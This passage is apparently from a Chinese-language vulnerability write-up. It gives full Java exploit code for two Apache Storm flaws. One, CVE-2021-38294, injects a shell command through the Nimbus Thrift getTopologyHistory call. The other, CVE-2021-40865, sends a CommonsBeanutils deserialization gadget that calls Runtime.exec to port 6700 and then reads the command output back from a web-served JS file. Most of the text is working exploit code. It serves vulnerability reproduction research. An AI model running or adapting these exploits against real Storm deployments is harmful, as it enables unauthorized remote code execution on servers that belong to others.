调试了一下EXP，由于是直接的命令执行，因此直接采用将执行结果写入一个不存在的js中（命令执行自动生成），访问web端js即可。
    import com.github.kevinsawicki.http.HttpRequest;
    import org.apache.storm.generated.AuthorizationException;
    import org.apache.storm.thrift.TException;
    import org.apache.storm.thrift.transport.TTransportException;
    import org.apache.storm.utils.NimbusClient;
    import java.util.ArrayList;
    import java.util.HashMap;
    import java.util.List;
    public class CVE_2021_38294_ECHO {
        public static void main(String[] args) throws Exception, AuthorizationException {
            String command = "ifconfig";
            HashMap config = new HashMap();
            List seeds = new ArrayList();
            seeds.add("localhost");
            config.put("storm.thrift.transport", "org.apache.storm.security.auth.SimpleTransportPlugin");
            config.put("storm.thrift.socket.timeout.ms", 60000);
            config.put("nimbus.seeds", seeds);
            config.put("storm.nimbus.retry.times", 5);
            config.put("storm.nimbus.retry.interval.millis", 2000);
            config.put("storm.nimbus.retry.intervalceiling.millis", 60000);
            config.put("nimbus.thrift.port", 6627);
            config.put("nimbus.thrift.max_buffer_size", 1048576);
            config.put("nimbus.thrift.threads", 64);
            NimbusClient nimbusClient = new NimbusClient(config, "localhost", 6627);
            nimbusClient.getClient().getTopologyHistory("foo;" + command + "> ../public/js/log.min.js; id");
            String response = HttpRequest.get("http://127.0.0.1:8082/js/log.min.js").body();
            System.out.println(response);
        }
    }
### CVE-2021-40865
复现如下
原本POC只有URLDNS的探测，在依赖中看到CommonsBeanutils-1.7.0版本，直接使用Ysoserial的payload也可以，但是为了缩小体积，这里直接使用Phithon师傅的Cb代码进行改造。改造后的代码如下
    import com.github.kevinsawicki.http.HttpRequest;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.CtMethod;
    import org.apache.commons.beanutils.BeanComparator;
    import org.apache.commons.io.IOUtils;
    import org.apache.storm.serialization.KryoValuesSerializer;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.math.BigInteger;
    import java.net.*;
    import java.util.HashMap;
    import java.util.PriorityQueue;
    //import javassist.ClassPool;
    /**
     * Hello world!
     *
     */
    public class CVE_2021_40865_ECHO
    {
        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
        public static byte[] buffer(KryoValuesSerializer ser, Object obj) throws IOException {
            byte[] payload = ser.serializeObject(obj);
            BigInteger codeInt = BigInteger.valueOf(-600);
            byte[] code = codeInt.toByteArray();
            BigInteger lengthInt = BigInteger.valueOf(payload.length);
            byte[] length = lengthInt.toByteArray();
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream( );
            outputStream.write(code);
            outputStream.write(new byte[] {0, 0});
            outputStream.write(length);
            outputStream.write(payload);
            return outputStream.toByteArray( );
        }
        public static KryoValuesSerializer getSerializer() throws MalformedURLException {
            HashMap conf = new HashMap<>();
            conf.put("topology.kryo.factory", "org.apache.storm.serialization.DefaultKryoFactory");
            conf.put("topology.tuple.serializer", "org.apache.storm.serialization.types.ListDelegateSerializer");
            conf.put("topology.skip.missing.kryo.registrations", false);
            conf.put("topology.fall.back.on.java.serialization", true);
            return new KryoValuesSerializer(conf);
        }
        public static void main(String[] args) {
            try {
                byte[] bytes = buffer(getSerializer(), getPayloadObject("ifconfig"));
                Socket socket = new Socket("127.0.0.1", 6700);
                OutputStream outputStream = socket.getOutputStream();
                outputStream.write(bytes);
                outputStream.flush();
                outputStream.close();
                String response = HttpRequest.get("http://127.0.0.1:8082/js/log.min.js").body();
                System.out.println(response);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static Object getPayloadObject(String command) throws Exception {
            TemplatesImpl obj = new TemplatesImpl();
            ClassPool classPool = ClassPool.getDefault();
            CtClass cc = classPool.get(EvilTemplatesImpl.class.getName());
            CtMethod ctMethod = cc.getDeclaredMethod("getCmd");
            ctMethod.setBody("return \""+ command + "  > /tmp/storm.log\";");
            setFieldValue(obj, "_bytecodes", new byte[][]{
                    cc.toBytecode()
            });
            setFieldValue(obj, "_name", "HelloTemplatesImpl");
            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
            final BeanComparator comparator = new BeanComparator();
            final PriorityQueue queue = new PriorityQueue(2, comparator);
            // stub data for replacement later
            queue.add(1);
            queue.add(1);
            setFieldValue(comparator, "property", "outputProperties");
            setFieldValue(queue, "queue", new Object[]{obj, obj});
            return queue;
        }
    }
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    public class EvilTemplatesImpl extends AbstractTranslet{
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
        public EvilTemplatesImpl() throws Exception {
            super();
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", getCmd()} : new String[]{"cmd.exe", "/c", getCmd() };
            Runtime.getRuntime().exec(cmds);
        }
        public String getCmd(){
            return "";
        }
    }
为了方便传参命令，这里使用javassist运行时修改类代码,利用命令执行后将结果输出到一个新的不存在的js文件中，再使用web请求访问该js即可。
不过以上两个exp的路径都要依赖于程序启动路径，因此在写文件这一块可能会有坑。
## 0x03 写在最后
由于本次分析时调试环境一直起不来，因此直接静态代码分析，可能会有漏掉或者错误的地方，还请师傅们指出和见谅。
## 0x04 参考
* * *